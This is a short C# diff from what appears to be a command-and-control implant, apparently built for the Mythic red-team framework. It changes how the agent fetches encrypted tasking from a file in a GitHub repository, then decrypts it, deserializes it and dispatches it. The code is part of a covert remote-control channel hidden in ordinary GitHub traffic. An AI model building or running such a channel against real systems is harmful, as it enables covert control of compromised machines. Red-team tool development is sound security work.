@@ -153,18 +153,13 @@ namespace Agent.Profiles
                 try
                 {
                     var fileContents = await client.Repository.Content.GetAllContentsByRef(OWNER, REPO, "client.txt", agentConfig.uuid);
-                    string mythResp = Misc.Base64Decode(fileContents[0].Content);
-
-                    if (mythResp.Substring(0, 36) == agentConfig.uuid)
+                    string mythResp = this.crypt.Decrypt(fileContents[0].Content);
+                    Console.WriteLine(mythResp);
+                    GetTaskingResponse gtr = JsonSerializer.Deserialize(mythResp, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
+                    if (gtr != null)
                     {
-                        string response = this.crypt.Decrypt(mythResp);
-                        Console.WriteLine(response);
-                        GetTaskingResponse gtr = JsonSerializer.Deserialize(mythResp.Substring(36), GetTaskingResponseJsonContext.Default.GetTaskingResponse);
-                        if (gtr != null)
-                        {
-                            TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
-                            this.SetTaskingReceived(null, tra);
-                        }
+                        TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
+                        this.SetTaskingReceived(null, tra);
                     }
                 }
                 catch (NotFoundException)
